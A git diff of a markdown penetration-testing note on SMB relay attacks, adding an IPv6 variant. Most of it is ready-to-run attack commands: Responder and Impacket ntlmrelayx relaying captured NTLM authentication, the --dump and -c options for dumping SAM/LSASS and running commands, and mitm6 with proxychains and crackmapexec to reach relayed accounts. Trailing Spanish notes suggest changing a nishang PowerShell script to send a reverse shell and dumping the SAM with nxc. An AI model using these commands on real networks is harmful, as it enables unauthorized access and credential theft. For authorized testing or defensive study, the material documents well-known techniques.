@@ -1,6 +1,7 @@
-**SMB Relay** is a type of attack that targets the Server Message Block (SMB) protocol used primarily for providing shared access to files, printers, and serial ports in a network.
+SMB Relay is an attack that abuses the **Server Message Block (SMB)** protocol, which is commonly used in Windows networks to share files, printers, and other resources.
 
-The attack involves intercepting and relaying SMB authentication attempts to another SMB server, allowing an attacker to gain unauthorized access or execute commands with the victim's credentials.
+The attacker takes advantage of the way SMB authentication works.  
+Instead of stealing a password, the attacker **impersonates the legitimate SMB server** and then **relays** the victim’s authentication attempt to a real server to gain access.
 
 ## Key Concepts
 
@@ -17,7 +18,7 @@ The attack involves intercepting and relaying SMB authentication attempts to ano
     - An attacker intercepts the authentication process.
     - Instead of cracking the intercepted credentials, the attacker relays them to another server to authenticate.
 
-## Attack Process
+## Basic Attack Process
 
 1. **Configuring Responder**:
 
@@ -31,16 +32,14 @@ sudo nano /etc/responder/Responder.conf
 responder -I eth0
 ```
 
-2. **Cracking hashes**:
-- After some time different user hashes would be captured by the Responder. All this hashes can be cracked using tools as *John* or *Hashcat* before executing the relay. 
 
-3. **Setting Up SMB Relay with Impacket**:
+2. **Setting Up SMB Relay with Impacket**:
 - Create a `targets.txt` file that contains the IP addresses of the target servers you want to relay the credentials to.
-- Use Impacket's **ntlmrelayx.py** script to relay the captured credentials to another target server.
+- While the Responder is active use Impacket's **ntlmrelayx.py** script to relay the captured credentials to another target server.
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
-4. **Gaining access**:
+3. **Gaining access**:
 Perform post-authentication actions:
 
 - Dump sensitive information (e.g., SAM database, LSASS memory).
@@ -50,6 +49,47 @@ Perform post-authentication actions:
 ntlmrelayx.py -tf targets.txt --dump
 ntlmrelayx.py -tf targets.txt -c "whoami"
 ```
+
+
+
+## IPv6 SMB Relaying Attack Process
+IPv6 relaying leverages the fact that many modern networks have IPv6 enabled by default, even if administrators primarily use IPv4. Attackers exploit IPv6 name resolution to trick clients into authenticating against a rogue server controlled by the attacker, allowing NTLM credentials to be captured and relayed.
+
+1. **Start mitm6:**
+
+```bash
+mitm6 -d <domain>
+```
+
+- This announces fake IPv6 RAs and provides a rogue DNS server.
+- All domain-joined Windows clients will attempt to resolve domain resources via the attacker.
+
+2. **Capture NTLM Authentication:**
+
+- When a client attempts to access any SMB or HTTP resource in the domain, it authenticates using NTLMv2.
+- The authentication request is sent to the attacker instead of the legitimate server.
+
+3. **Relay with NTLMRelayx.py:**
+
+- Relay these IPv6-captured NTLM credentials to a target system:
+```bash
+sudo ntlmrelayx.py -6 -tf targets.txt -socks -debug -smb2support
+```
+
+- The `-6` flag ensures the relay works over IPv6.
+- `-smb2support` is crucial as modern Windows systems often enforce SMB2/3.
+- `-socks` allows connecting through a SOCKS proxy to interact with the compromised account.
+
+4. **Connecting to the Relayed Account:**
+
+Once a relay has been successfully established, you can access the account using a **SOCKS proxy**:
+
+```bash
+proxychains crackmapexec smb <target-ip> -u <user> -p <anypassword> -d <domain>
+```
+
+---
+
 
 ## NTLMRelayx.py
 
@@ -73,3 +113,13 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```bash
 sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command>"
 ```
+
+
+nishang/shells invokepowershelltcp.ps1  anadir codigo malicioso para que mande una reverse a un puerto abierto
+
+
+para ipv6 usar mitm6 -d dominio
+hacer ntlmrelay indicando -6 ... -socks -debug -smb2support
+
+luego con proxychains para poder conectarse via socks a la cuenta a la que se tiene relay hacer
+proxychauns nxc smb target -u user -p cualquier coas -d dominio --sam 2>/dev/null
